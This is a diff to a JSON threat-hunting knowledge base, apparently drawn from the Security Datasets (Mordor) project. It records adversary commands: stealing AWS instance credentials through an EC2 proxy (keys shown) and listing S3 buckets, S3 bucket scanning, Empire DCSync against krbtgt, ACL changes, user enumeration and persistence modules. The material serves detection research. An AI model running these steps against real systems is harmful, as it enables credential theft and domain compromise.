@@ -736,5 +736,635 @@
         "remediation": "Block external C2 / attacker IP address at perimeter firewall and IPS. Isolate internal source host, capture PCAP network traffic for deep packet inspection, and terminate suspicious outbound processes."
       }
     }
+  },
+  "threat_feed": {},
+  "knowledge_docs": {
+    "SDAWS-200914011940": {
+      "id": "SDAWS-200914011940",
+      "document": "Knowledge Doc ID: SDAWS-200914011940\nTitle: AWS Cloud Bank Breach S3\nPlatform: AWS\nTags: EC2 Proxy Abuse, S3 Data Exfiltration\nMITRE ATT&CK IDs: T1078.004, T1530\nTactics: Initial Access, Persistence, Privilege Escalation, Defense Evasion, Collection\nTools: AWS CLI (Exfiltration)\nDescription: This dataset represents adversaries abusing a misconfigured EC2 reverse proxy to obtain instance profile keys and eventually exfiltrate files from an S3 bucket.\nAdversary Commands: > curl -s http://35.174.154.220/latest/meta-data/iam/security-credentials/ -H \"Host:169.254.169.254\"\nMordorNginxStack-BankingWAFRole-9S3E0UAE1MM0                                                                                                                                                              >\n> curl -s http://35.174.154.220/latest/meta-data/iam/security-credentials/MordorNginxStack-BankingWAFRole-9S3E0UAE1MM0 -H \"Host:169.254.169.254\"\n{\n\"Code\" : \"Success\",\n\"LastUpdated\" : \"2020-09-14T00:49:26Z\",\n\"Type\" : \"AWS-HMAC\",\n\"AccessKeyId\" : \"ASIA5FLZVX4OPVKKVBMX\",\n\"SecretAccessKey\" : \"aD8Hchl4f1BrbfgFvwEBVRZ0oCXrifESaC3B0a03\",\n\"Token\" : \"TOKEN\",\n\"Expiration\" : \"2020-09-14T07:10:27Z\"\n}\n> aws configure --profile erratic\nAWS Access Key ID [None]: ASIA5FLZVX4OPVKKVBMX\nAWS Secret Access Key [None]: aD8Hchl4f1BrbfgFvwEBVRZ0oCXrifESaC3B0a03\nDefault region name [None]: us-east-1\nDefault output format [None]: json\n> echo aws_session_token = \"TOKEN\" >> ~/.aws/credentials\n> aws s3 ls --profile erratic\n2020-09-13 20:00:32 mordorctstack-s3bucketforcloudtrail-1gj7vvt2ul642\n2020-09-13 19:59:59 mordors3stack-s3bucket-llp2yingx64a\n> aws s3 ls mordors3stack-s3bucket-llp2yingx64a --profile erratic\n",
+      "metadata": {
+        "doc_id": "SDAWS-200914011940",
+        "id": "SDAWS-200914011940",
+        "title": "AWS Cloud Bank Breach S3",
+        "platform": "AWS",
+        "platforms": [
+          "AWS"
+        ],
+        "tags": [
+          "EC2 Proxy Abuse",
+          "S3 Data Exfiltration"
+        ],
+        "mitre_ids": [
+          "T1078.004",
+          "T1530"
+        ],
+        "tactics": [
+          "Initial Access",
+          "Persistence",
+          "Privilege Escalation",
+          "Defense Evasion",
+          "Collection"
+        ],
+        "description": "This dataset represents adversaries abusing a misconfigured EC2 reverse proxy to obtain instance profile keys and eventually exfiltrate files from an S3 bucket.",
+        "adversary_commands": "> curl -s http://35.174.154.220/latest/meta-data/iam/security-credentials/ -H \"Host:169.254.169.254\"\nMordorNginxStack-BankingWAFRole-9S3E0UAE1MM0                                                                                                                                                              >\n> curl -s http://35.174.154.220/latest/meta-data/iam/security-credentials/MordorNginxStack-BankingWAFRole-9S3E0UAE1MM0 -H \"Host:169.254.169.254\"\n{\n\"Code\" : \"Success\",\n\"LastUpdated\" : \"2020-09-14T00:49:26Z\",\n\"Type\" : \"AWS-HMAC\",\n\"AccessKeyId\" : \"ASIA5FLZVX4OPVKKVBMX\",\n\"SecretAccessKey\" : \"aD8Hchl4f1BrbfgFvwEBVRZ0oCXrifESaC3B0a03\",\n\"Token\" : \"TOKEN\",\n\"Expiration\" : \"2020-09-14T07:10:27Z\"\n}\n> aws configure --profile erratic\nAWS Access Key ID [None]: ASIA5FLZVX4OPVKKVBMX\nAWS Secret Access Key [None]: aD8Hchl4f1BrbfgFvwEBVRZ0oCXrifESaC3B0a03\nDefault region name [None]: us-east-1\nDefault output format [None]: json\n> echo aws_session_token = \"TOKEN\" >> ~/.aws/credentials\n> aws s3 ls --profile erratic\n2020-09-13 20:00:32 mordorctstack-s3bucketforcloudtrail-1gj7vvt2ul642\n2020-09-13 19:59:59 mordors3stack-s3bucket-llp2yingx64a\n> aws s3 ls mordors3stack-s3bucket-llp2yingx64a --profile erratic",
+        "tools": [
+          "AWS CLI (Exfiltration)"
+        ],
+        "notebooks": [],
+        "source_file": "SDAWS-200914011940.yaml",
+        "content_hash": ""
+      }
+    },
+    "SDAWS-2202181000": {
+      "id": "SDAWS-2202181000",
+      "document": "Knowledge Doc ID: SDAWS-2202181000\nTitle: AWS S3 Honey Bucket Logs\nPlatform: AWS\nTags: S3 Public Honeybucket Discovery\nMITRE ATT&CK IDs: T1580\nTactics: Discovery\nTools: \nDescription: This dataset represents adversaries trying to scan , discover and access open S3 honeybucket based on known hostname patterns. in this case honeybucket microsoft-devtest.s3.amazonaws.com.\nAdversary Commands: > pip3 install s3scanner\n> s3scanner --threads 8 scan --buckets-file ./bucket-names.txt                                                                                                                                                              >\n> curl -s \"microsoft-devtest.s3.amazonaws.com\"\n> aws s3 ls s3://microsoft-devtest.s3.amazonaws.com\n> echo 'Trying to write text file to open public bucket' > hello.txt\n> aws s3 sync hello.txt s3://microsoft-devtest.s3.amazonaws.com",
+      "metadata": {
+        "doc_id": "SDAWS-2202181000",
+        "id": "SDAWS-2202181000",
+        "title": "AWS S3 Honey Bucket Logs",
+        "platform": "AWS",
+        "platforms": [
+          "AWS"
+        ],
+        "tags": [
+          "S3 Public Honeybucket Discovery"
+        ],
+        "mitre_ids": [
+          "T1580"
+        ],
+        "tactics": [
+          "Discovery"
+        ],
+        "description": "This dataset represents adversaries trying to scan , discover and access open S3 honeybucket based on known hostname patterns. in this case honeybucket microsoft-devtest.s3.amazonaws.com.",
+        "adversary_commands": "> pip3 install s3scanner\n> s3scanner --threads 8 scan --buckets-file ./bucket-names.txt                                                                                                                                                              >\n> curl -s \"microsoft-devtest.s3.amazonaws.com\"\n> aws s3 ls s3://microsoft-devtest.s3.amazonaws.com\n> echo 'Trying to write text file to open public bucket' > hello.txt\n> aws s3 sync hello.txt s3://microsoft-devtest.s3.amazonaws.com",
+        "tools": [],
+        "notebooks": [],
+        "source_file": "SDAWS-2202181000.yaml",
+        "content_hash": ""
+      }
+    },
+    "SDLIN-201110074812": {
+      "id": "SDLIN-201110074812",
+      "document": "Knowledge Doc ID: SDLIN-201110074812\nTitle: Arp Cache Discovery\nPlatform: Linux\nTags: \nMITRE ATT&CK IDs: T1018\nTactics: Discovery\nTools: sh\nDescription: This dataset represents a threat actor using arp to list out the arp cache.\nAdversary Commands: wardog@UBUNTU5:~$ arp -a | grep -v '^?'\n_gateway (192.168.2.1) at 12:34:56:78:9a:bc [ether] on eth0",
+      "metadata": {
+        "doc_id": "SDLIN-201110074812",
+        "id": "SDLIN-201110074812",
+        "title": "Arp Cache Discovery",
+        "platform": "Linux",
+        "platforms": [
+          "Linux"
+        ],
+        "tags": [],
+        "mitre_ids": [
+          "T1018"
+        ],
+        "tactics": [
+          "Discovery"
+        ],
+        "description": "This dataset represents a threat actor using arp to list out the arp cache.",
+        "adversary_commands": "wardog@UBUNTU5:~$ arp -a | grep -v '^?'\n_gateway (192.168.2.1) at 12:34:56:78:9a:bc [ether] on eth0",
+        "tools": [
+          "sh"
+        ],
+        "notebooks": [],
+        "source_file": "SDLIN-201110074812.yaml",
+        "content_hash": ""
+      }
+    },
+    "SDLIN-201110081941": {
+      "id": "SDLIN-201110081941",
+      "document": "Knowledge Doc ID: SDLIN-201110081941\nTitle: DD Binary Padding Hash Change\nPlatform: Linux\nTags: \nMITRE ATT&CK IDs: T1027.001\nTactics: Defense Evasion\nTools: sh\nDescription: This dataset represents a threat actor using dd to add a zero to the binary to change the hash.\nAdversary Commands: md5sum /tmp/psexec.py\n5aa8b93e9b40c04d6d9d0cc8cd3975ed  /tmp/psexec.py\ndd if=/dev/zero bs=1 count=1 >> /tmp/psexec.py\n1+0 records in\n1+0 records out\n1 byte copied, 5.6002e-05 s, 17.9 kB/s\nmd5sum /tmp/psexec.py\nc509e5bd899de81d603da3f61e717837  /tmp/psexec.py",
+      "metadata": {
+        "doc_id": "SDLIN-201110081941",
+        "id": "SDLIN-201110081941",
+        "title": "DD Binary Padding Hash Change",
+        "platform": "Linux",
+        "platforms": [
+          "Linux"
+        ],
+        "tags": [],
+        "mitre_ids": [
+          "T1027.001"
+        ],
+        "tactics": [
+          "Defense Evasion"
+        ],
+        "description": "This dataset represents a threat actor using dd to add a zero to the binary to change the hash.",
+        "adversary_commands": "md5sum /tmp/psexec.py\n5aa8b93e9b40c04d6d9d0cc8cd3975ed  /tmp/psexec.py\ndd if=/dev/zero bs=1 count=1 >> /tmp/psexec.py\n1+0 records in\n1+0 records out\n1 byte copied, 5.6002e-05 s, 17.9 kB/s\nmd5sum /tmp/psexec.py\nc509e5bd899de81d603da3f61e717837  /tmp/psexec.py",
+        "tools": [
+          "sh"
+        ],
+        "notebooks": [],
+        "source_file": "SDLIN-201110081941.yaml",
+        "content_hash": ""
+      }
+    },
+    "SDWIN-190301125905": {
+      "id": "SDWIN-190301125905",
+      "document": "Knowledge Doc ID: SDWIN-190301125905\nTitle: Empire Powerview Add-DomainObjectAcl\nPlatform: Windows\nTags: AD Object Modification, AD Object nTSecurityDescriptor, LDAP ModifyRequest\nMITRE ATT&CK IDs: T1222.001\nTactics: Defense Evasion\nTools: Empire (powerview)\nDescription: These datasets represent adversaries with enough permissions (i.e. domain admin) adding an access control entry (ACE) to the discretionary access control list (DACL) of an Active Directory object (i.e Root Domain). One example could be adversaries modifying the root domain DACL to allow a specific domain user, despite being in no privileged groups and not having local admin rights on the domain controller itself, to use Active Directory replication services and obtain secret domain data (i.e. Other user NTLM Hashes)\nAdversary Commands: (Empire: stager/multi/launcher) > agents\n[*] Active agents:\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\nA7BWPR32 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5904   5/0.0    2020-09-18 18:29:36  http\nHBEW9G1D ps 172.18.39.6     WORKSTATION6      THESHIRE\\sbeavers       powershell         6036   5/0.0    2020-09-18 18:15:39  http\nUF5MYK42 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         6404   5/0.0    2020-09-20 21:28:07  http\n8BUCWV1P ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         2488   5/0.0    2020-09-21 17:09:43  http\n(Empire: agents) > interact 8BUCWV1P\n(Empire: 8BUCWV1P) > scriptimport data/module_source/situational_awareness/network/powerview.ps1\n[*] Tasked 8BUCWV1P to run TASK_SCRIPT_IMPORT\n[*] Agent 8BUCWV1P tasked with task ID 1\n(Empire: 8BUCWV1P) >\nscript successfully saved in memory\n(Empire: 8BUCWV1P) > scriptcmd Add-DomainObjectAcl -TargetId",
+      "metadata": {
+        "doc_id": "SDWIN-190301125905",
+        "id": "SDWIN-190301125905",
+        "title": "Empire Powerview Add-DomainObjectAcl",
+        "platform": "Windows",
+        "platforms": [
+          "Windows"
+        ],
+        "tags": [
+          "AD Object Modification",
+          "AD Object nTSecurityDescriptor",
+          "LDAP ModifyRequest"
+        ],
+        "mitre_ids": [
+          "T1222.001"
+        ],
+        "tactics": [
+          "Defense Evasion"
+        ],
+        "description": "These datasets represent adversaries with enough permissions (i.e. domain admin) adding an access control entry (ACE) to the discretionary access control list (DACL) of an Active Directory object (i.e Root Domain). One example could be adversaries modifying the root domain DACL to allow a specific domain user, despite being in no privileged groups and not having local admin rights on the domain controller itself, to use Active Directory replication services and obtain secret domain data (i.e. Other user NTLM Hashes)",
+        "adversary_commands": "(Empire: stager/multi/launcher) > agents\n[*] Active agents:\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\nA7BWPR32 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5904   5/0.0    2020-09-18 18:29:36  http\nHBEW9G1D ps 172.18.39.6     WORKSTATION6      THESHIRE\\sbeavers       powershell         6036   5/0.0    2020-09-18 18:15:39  http\nUF5MYK42 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         6404   5/0.0    2020-09-20 21:28:07  http\n8BUCWV1P ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         2488   5/0.0    2020-09-21 17:09:43  http\n(Empire: agents) > interact 8BUCWV1P\n(Empire: 8BUCWV1P) > scriptimport data/module_source/situational_awareness/network/powerview.ps1\n[*] Tasked 8BUCWV1P to run TASK_SCRIPT_IMPORT\n[*] Agent 8BUCWV1P tasked with task ID 1\n(Empire: 8BUCWV1P) >\nscript successfully saved in memory\n(Empire: 8BUCWV1P) > scriptcmd Add-DomainObjectAcl -TargetId",
+        "tools": [
+          "Empire (powerview)"
+        ],
+        "notebooks": [
+          "Active Directory Replication User Backdoor (https://threathunterplaybook.com/notebooks/windows/05_defense_evasion/WIN-190101151110.html)"
+        ],
+        "source_file": "SDWIN-190301125905.yaml",
+        "content_hash": ""
+      }
+    },
+    "SDWIN-190301174830": {
+      "id": "SDWIN-190301174830",
+      "document": "Knowledge Doc ID: SDWIN-190301174830\nTitle: Empire DCSync\nPlatform: Windows\nTags: AD Replication services, RPC DRSUAPI DsGetNCChanges\nMITRE ATT&CK IDs: T1003.006\nTactics: Credential Access\nTools: Empire (DCSync)\nDescription: This dataset represents adversaries abusing Active Directory Replication services to retrieve secret domain data (i.e. NTLM hashes) from domain accounts.\nAdversary Commands: (Empire: stager/multi/launcher) > agents\n[*] Active agents:\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n4SUZ8X62 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         4092   5/0.0    2020-09-21 21:59:29  http\n1EHYPBVC ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         7456   5/0.0    2020-09-21 22:56:58  http\n(Empire: agents) > interact 1EHYPBVC\n(Empire: 1EHYPBVC) >\n(Empire: 1EHYPBVC) > usemodule credentials/mimikatz/dcsync\n(Empire: powershell/credentials/mimikatz/dcsync) > set user krbtgt\n(Empire: powershell/credentials/mimikatz/dcsync) > set domain theshire.local\n(Empire: powershell/credentials/mimikatz/dcsync) > set dc MORDORDC.theshire.local\n(Empire: powershell/credentials/mimikatz/dcsync) > info\nName: Invoke-Mimikatz DCsync\nModule: powershell/credentials/mimikatz/dcsync\nNeedsAdmin: False\nOpsecSafe: True\nLanguage: powershell\nMinLanguageVersion: 2\nBackground: True\nOutputExtension: None\nAuthors:\n",
+      "metadata": {
+        "doc_id": "SDWIN-190301174830",
+        "id": "SDWIN-190301174830",
+        "title": "Empire DCSync",
+        "platform": "Windows",
+        "platforms": [
+          "Windows"
+        ],
+        "tags": [
+          "AD Replication services",
+          "RPC DRSUAPI DsGetNCChanges"
+        ],
+        "mitre_ids": [
+          "T1003.006"
+        ],
+        "tactics": [
+          "Credential Access"
+        ],
+        "description": "This dataset represents adversaries abusing Active Directory Replication services to retrieve secret domain data (i.e. NTLM hashes) from domain accounts.",
+        "adversary_commands": "(Empire: stager/multi/launcher) > agents\n[*] Active agents:\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n4SUZ8X62 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         4092   5/0.0    2020-09-21 21:59:29  http\n1EHYPBVC ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         7456   5/0.0    2020-09-21 22:56:58  http\n(Empire: agents) > interact 1EHYPBVC\n(Empire: 1EHYPBVC) >\n(Empire: 1EHYPBVC) > usemodule credentials/mimikatz/dcsync\n(Empire: powershell/credentials/mimikatz/dcsync) > set user krbtgt\n(Empire: powershell/credentials/mimikatz/dcsync) > set domain theshire.local\n(Empire: powershell/credentials/mimikatz/dcsync) > set dc MORDORDC.theshire.local\n(Empire: powershell/credentials/mimikatz/dcsync) > info\nName: Invoke-Mimikatz DCsync\nModule: powershell/credentials/mimikatz/dcsync\nNeedsAdmin: False\nOpsecSafe: True\nLanguage: powershell\nMinLanguageVersion: 2\nBackground: True\nOutputExtension: None\nAuthors:",
+        "tools": [
+          "Empire (DCSync)"
+        ],
+        "notebooks": [
+          "Active Directory Replication From Non-Domain-Controller Accounts (https://threathunterplaybook.com/notebooks/windows/06_credential_access/WIN-180815210510.html)"
+        ],
+        "source_file": "SDWIN-190301174830.yaml",
+        "content_hash": ""
+      }
+    },
+    "SDWIN-190319020147": {
+      "id": "SDWIN-190319020147",
+      "document": "Knowledge Doc ID: SDWIN-190319020147\nTitle: Empire Net Local Administrators Group\nPlatform: Windows\nTags: Local Administrators Group Enumeration\nMITRE ATT&CK IDs: T1069.001\nTactics: Discovery\nTools: Empire (shell)\nDescription: This dataset represents adversaries enumerating members of the local Administratrors group via the net.exe utility\nAdversary Commands: (Empire: 1EHYPBVC) > agents\n[*] Active agents:\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n4SUZ8X62 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         4092   5/0.0    2020-09-21 21:59:29  http\n1EHYPBVC ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         7456   5/0.0    2020-09-21 23:18:05  http\n(Empire: agents) > interact 1EHYPBVC\n(Empire: 1EHYPBVC) > shell net localgroup Administrators\n[*] Tasked 1EHYPBVC to run TASK_SHELL\n[*] Agent 1EHYPBVC tasked with task ID 2\n(Empire: 1EHYPBVC) >\nAlias name     Administrators\nComment        Administrators have complete and unrestricted access to the computer/domain\nMembers\n-------------------------------------------------------------------------------\nTHESHIRE\\Domain Admins\nwardog\nThe command completed successfully.\n..Command execution completed.\n(Empire: 1EHYPBVC) >",
+      "metadata": {
+        "doc_id": "SDWIN-190319020147",
+        "id": "SDWIN-190319020147",
+        "title": "Empire Net Local Administrators Group",
+        "platform": "Windows",
+        "platforms": [
+          "Windows"
+        ],
+        "tags": [
+          "Local Administrators Group Enumeration"
+        ],
+        "mitre_ids": [
+          "T1069.001"
+        ],
+        "tactics": [
+          "Discovery"
+        ],
+        "description": "This dataset represents adversaries enumerating members of the local Administratrors group via the net.exe utility",
+        "adversary_commands": "(Empire: 1EHYPBVC) > agents\n[*] Active agents:\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n4SUZ8X62 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         4092   5/0.0    2020-09-21 21:59:29  http\n1EHYPBVC ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         7456   5/0.0    2020-09-21 23:18:05  http\n(Empire: agents) > interact 1EHYPBVC\n(Empire: 1EHYPBVC) > shell net localgroup Administrators\n[*] Tasked 1EHYPBVC to run TASK_SHELL\n[*] Agent 1EHYPBVC tasked with task ID 2\n(Empire: 1EHYPBVC) >\nAlias name     Administrators\nComment        Administrators have complete and unrestricted access to the computer/domain\nMembers\n-------------------------------------------------------------------------------\nTHESHIRE\\Domain Admins\nwardog\nThe command completed successfully.\n..Command execution completed.\n(Empire: 1EHYPBVC) >",
+        "tools": [
+          "Empire (shell)"
+        ],
+        "notebooks": [],
+        "source_file": "SDWIN-190319020147.yaml",
+        "content_hash": ""
+      }
+    },
+    "SDWIN-190319020729": {
+      "id": "SDWIN-190319020729",
+      "document": "Knowledge Doc ID: SDWIN-190319020729\nTitle: Empire Net Local Users\nPlatform: Windows\nTags: Local Users Enumeration\nMITRE ATT&CK IDs: T1087.001\nTactics: Discovery\nTools: Empire (shell)\nDescription: This dataset represents adversaries enumerating all local users on an endpoint\nAdversary Commands: (Empire: 1EHYPBVC) > agents\n[*] Active agents:\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n4SUZ8X62 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         4092   5/0.0    2020-09-21 21:59:29  http\n1EHYPBVC ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         7456   5/0.0    2020-09-21 23:25:39  http\n(Empire: agents) > interact 1EHYPBVC\n(Empire: 1EHYPBVC) > shell net user\n[*] Tasked 1EHYPBVC to run TASK_SHELL\n[*] Agent 1EHYPBVC tasked with task ID 3\n(Empire: 1EHYPBVC) >\nUser accounts for \\\\WORKSTATION5\n-------------------------------------------------------------------------------\nDefaultAccount           Guest                    wardog\nWDAGUtilityAccount\nThe command completed successfully.\n..Command execution completed.\n(Empire: 1EHYPBVC) >",
+      "metadata": {
+        "doc_id": "SDWIN-190319020729",
+        "id": "SDWIN-190319020729",
+        "title": "Empire Net Local Users",
+        "platform": "Windows",
+        "platforms": [
+          "Windows"
+        ],
+        "tags": [
+          "Local Users Enumeration"
+        ],
+        "mitre_ids": [
+          "T1087.001"
+        ],
+        "tactics": [
+          "Discovery"
+        ],
+        "description": "This dataset represents adversaries enumerating all local users on an endpoint",
+        "adversary_commands": "(Empire: 1EHYPBVC) > agents\n[*] Active agents:\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n4SUZ8X62 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         4092   5/0.0    2020-09-21 21:59:29  http\n1EHYPBVC ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         7456   5/0.0    2020-09-21 23:25:39  http\n(Empire: agents) > interact 1EHYPBVC\n(Empire: 1EHYPBVC) > shell net user\n[*] Tasked 1EHYPBVC to run TASK_SHELL\n[*] Agent 1EHYPBVC tasked with task ID 3\n(Empire: 1EHYPBVC) >\nUser accounts for \\\\WORKSTATION5\n-------------------------------------------------------------------------------\nDefaultAccount           Guest                    wardog\nWDAGUtilityAccount\nThe command completed successfully.\n..Command execution completed.\n(Empire: 1EHYPBVC) >",
+        "tools": [
+          "Empire (shell)"
+        ],
+        "notebooks": [],
+        "source_file": "SDWIN-190319020729.yaml",
+        "content_hash": ""
+      }
+    },
+    "SDWIN-190319021158": {
+      "id": "SDWIN-190319021158",
+      "document": "Knowledge Doc ID: SDWIN-190319021158\nTitle: Empire Net Domain Users\nPlatform: Windows\nTags: Domain Users Enumeration, RPC SAMR EnumDomainUsers\nMITRE ATT&CK IDs: T1087.002\nTactics: Discovery\nTools: Empire (shell)\nDescription: This dataset represents adversaries enumerating all users that belong to a domain via RPC SAMR EnumDomainUsers.\nAdversary Commands: (Empire: 1EHYPBVC) > agents\n[*] Active agents:\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n4SUZ8X62 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         4092   5/0.0    2020-09-21 21:59:29  http\n1EHYPBVC ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         7456   5/0.0    2020-09-21 23:25:39  http\n(Empire: agents) > interact 1EHYPBVC\n(Empire: 1EHYPBVC) > shell net user /domain\n[*] Tasked 1EHYPBVC to run TASK_SHELL\n[*] Agent 1EHYPBVC tasked with task ID 5\n(Empire: 1EHYPBVC) >\nThe request will be processed at a domain controller for domain theshire.local.\nUser accounts for \\\\MORDORDC.theshire.local\n-------------------------------------------------------------------------------\ndschrute                 Guest                    krbtgt\nlrodriguez               mscott                   nmartha\npbeesly                  pgustavo                 sbeavers\nsysmonsvc                wardog\nThe command completed ",
+      "metadata": {
+        "doc_id": "SDWIN-190319021158",
+        "id": "SDWIN-190319021158",
+        "title": "Empire Net Domain Users",
+        "platform": "Windows",
+        "platforms": [
+          "Windows"
+        ],
+        "tags": [
+          "Domain Users Enumeration",
+          "RPC SAMR EnumDomainUsers"
+        ],
+        "mitre_ids": [
+          "T1087.002"
+        ],
+        "tactics": [
+          "Discovery"
+        ],
+        "description": "This dataset represents adversaries enumerating all users that belong to a domain via RPC SAMR EnumDomainUsers.",
+        "adversary_commands": "(Empire: 1EHYPBVC) > agents\n[*] Active agents:\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n4SUZ8X62 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         4092   5/0.0    2020-09-21 21:59:29  http\n1EHYPBVC ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         7456   5/0.0    2020-09-21 23:25:39  http\n(Empire: agents) > interact 1EHYPBVC\n(Empire: 1EHYPBVC) > shell net user /domain\n[*] Tasked 1EHYPBVC to run TASK_SHELL\n[*] Agent 1EHYPBVC tasked with task ID 5\n(Empire: 1EHYPBVC) >\nThe request will be processed at a domain controller for domain theshire.local.\nUser accounts for \\\\MORDORDC.theshire.local\n-------------------------------------------------------------------------------\ndschrute                 Guest                    krbtgt\nlrodriguez               mscott                   nmartha\npbeesly                  pgustavo                 sbeavers\nsysmonsvc                wardog\nThe command completed",
+        "tools": [
+          "Empire (shell)"
+        ],
+        "notebooks": [],
+        "source_file": "SDWIN-190319021158.yaml",
+        "content_hash": ""
+      }
+    },
+    "SDWIN-190319023812": {
+      "id": "SDWIN-190319023812",
+      "document": "Knowledge Doc ID: SDWIN-190319023812\nTitle: Empire Userland Registry Run Keys\nPlatform: Windows\nTags: Local Registry Modification, Registry Run Keys\nMITRE ATT&CK IDs: T1547.001\nTactics: Persistence\nTools: Empire (Registry)\nDescription: This dataset represents adversaries modifying local Run registry keys (i.e. HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run) for persistence. It also captures the execution of the persistence mechanism.\nAdversary Commands: (Empire: stager/multi/launcher) >\n(Empire: stager/multi/launcher) > agents\n[*] Active agents:\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\nKU86XWEL ps 172.18.39.5     WORKSTATION5      THESHIRE\\pgustavo       powershell         5376   5/0.0    2020-09-04 07:02:57  http\n(Empire: agents) > interact KU86XWEL\n(Empire: KU86XWEL) >\n(Empire: KU86XWEL) > usemodule persistence/\nelevated/registry*                 misc/add_netuser                   misc/install_ssp*                  powerbreach/resolver\nelevated/rid_hijack*               misc/add_sid_history*              misc/memssp*                       userland/backdoor_lnk\nelevated/schtasks*                 misc/debugger*                     misc/skeleton_key*                 userland/registry\nelevated/wmi*                      misc/disable_machine_acct_change*  powerbreach/deaduser               userland/schtasks\nelevated/wmi_updater*              misc/get_ssps                      powerbreach/eventlog*\n(Emp",
+      "metadata": {
+        "doc_id": "SDWIN-190319023812",
+        "id": "SDWIN-190319023812",
+        "title": "Empire Userland Registry Run Keys",
+        "platform": "Windows",
+        "platforms": [
+          "Windows"
+        ],
+        "tags": [
+          "Local Registry Modification",
+          "Registry Run Keys"
+        ],
+        "mitre_ids": [
+          "T1547.001"
+        ],
+        "tactics": [
+          "Persistence"
+        ],
+        "description": "This dataset represents adversaries modifying local Run registry keys (i.e. HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run) for persistence. It also captures the execution of the persistence mechanism.",
+        "adversary_commands": "(Empire: stager/multi/launcher) >\n(Empire: stager/multi/launcher) > agents\n[*] Active agents:\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\nKU86XWEL ps 172.18.39.5     WORKSTATION5      THESHIRE\\pgustavo       powershell         5376   5/0.0    2020-09-04 07:02:57  http\n(Empire: agents) > interact KU86XWEL\n(Empire: KU86XWEL) >\n(Empire: KU86XWEL) > usemodule persistence/\nelevated/registry*                 misc/add_netuser                   misc/install_ssp*                  powerbreach/resolver\nelevated/rid_hijack*               misc/add_sid_history*              misc/memssp*                       userland/backdoor_lnk\nelevated/schtasks*                 misc/debugger*                     misc/skeleton_key*                 userland/registry\nelevated/wmi*                      misc/disable_machine_acct_change*  powerbreach/deaduser               userland/schtasks\nelevated/wmi_updater*              misc/get_ssps                      powerbreach/eventlog*\n(Emp",
+        "tools": [
+          "Empire (Registry)"
+        ],
+        "notebooks": [],
+        "source_file": "SDWIN-190319023812.yaml",
+        "content_hash": ""
+      }
+    },
+    "SDWIN-190319024742": {
+      "id": "SDWIN-190319024742",
+      "document": "Knowledge Doc ID: SDWIN-190319024742\nTitle: Empire Userland Scheduled Tasks\nPlatform: Windows\nTags: Local Scheduled Tasks\nMITRE ATT&CK IDs: T1053.005\nTactics: Persistence\nTools: Empire (schtasks)\nDescription: This dataset represents adversaries creating and/or executing local scheduled tasks to maintain persistence in an environment.\nAdversary Commands: (Empire: stager/multi/launcher) > agents\n[*] Active agents:\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\nA7BWPR32 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5904   5/0.0    2020-09-18 18:29:36  http\nHBEW9G1D ps 172.18.39.6     WORKSTATION6      THESHIRE\\sbeavers       powershell         6036   5/0.0    2020-09-18 18:15:39  http\nUF5MYK42 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         6404   5/0.0    2020-09-20 21:28:07  